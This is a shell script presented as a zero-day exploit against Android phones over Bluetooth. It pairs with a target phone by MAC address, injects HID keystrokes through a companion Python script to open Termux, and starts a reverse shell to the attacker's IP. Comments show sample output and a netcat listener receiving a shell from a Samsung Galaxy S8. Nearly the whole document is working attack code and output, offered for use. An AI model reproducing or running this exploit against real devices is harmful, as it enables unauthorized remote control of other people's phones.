#PHONE="08:AE:D6:6F:DD:F8"
#LOCAL_IP="10.0.2.2"

# oxagast / Marshall Whittaker
# 0day as of Apr 21, 2023
# if you get caught using this...
#
# Tested on a Samsung Galaxy S8 running Android 9
# Termux must be installed on the device.
#
# $ sudo ./run.sh 08:AE:D6:6F:DD:F8 10.0.2.2
# [*] Reverse shell built for 10.0.2.2:6543
# [*] Pairing to 08:AE:D6:6F:DD:F8
# [!] Paired 08:AE:D6:6F:DD:F8 to DC:53:60:6C:FC:B3
# [*] Prepped to send HID shellcode, using finder to find termux, then termux to pop a reverse shell from 08:AE:D6:6F:DD:F8...
# [!] Go to another terminal and start a netcat listener on port 6543 to handle the shell!
# [*] Registered HID profile
# [!] Ready, waiting for connection from phone
# [*] Control channel connected to 08:AE:D6:6F:DD:F8
# [*] Interrupt channel connected to 08:AE:D6:6F:DD:F8
# [*] Trying to attain control over device...
# [*] Sending back to home screen
# [*] Trying to pull up finder...
# [*] Trying to find termux...
# [*] Pushing shellcode now...
# [!] Check your netcat listener for a shell!
# [!] Exploit finished.
# $
#
# $ nc -l -p 6543 -v
# listening on [any] 6543 ...
# connect to [10.0.2.2] from nerkon [10.0.2.5] 56434
# ~ $ id && uname -a
# id && uname -a
# uid=10466(u0_a466) gid=10466(u0_a466) groups=10466(u0_a466),3003(inet),9997(everybody),20466(u0_a466_cache),50466(all_a466)
# Linux localhost 4.4.153-17214672 #2 SMP PREEMPT Thu Oct 21 19:08:15 KST 2021 aarch64 Android



PHONE=$1
LOCAL_IP=$2

if [ $# -eq 2 ]; then
	echo "[*] Building reverse shell for ${LOCAL_IP}:6543"
	echo "[*] Pairing to ${PHONE}"
	CONTR=`echo "power on\n\nshow\n\ndiscoverable on\n\npair ${PHONE}\n\ntrust ${PHONE}\n\nconnect ${PHONE}\n\n" | bluetoothctl | grep Controller | cut -d ' ' -f 2`
	echo "[!] Paired ${PHONE} to ${CONTR}"
	echo "[*] Prepped to send HID shellcode, using finder to find termux, then termux to pop a reverse shell from ${PHONE}..."
	echo "[!] Go to another terminal and start a netcat listener on port ${LOCAL_PORT} to handle the shell!"
	python3 rougetooth.py "${CONTR}" "${PHONE}" "${LOCAL_IP}"
else echo "Sorry, the syntax is $0 [PHONE BT MAC] [LOCAL IP]"
fi
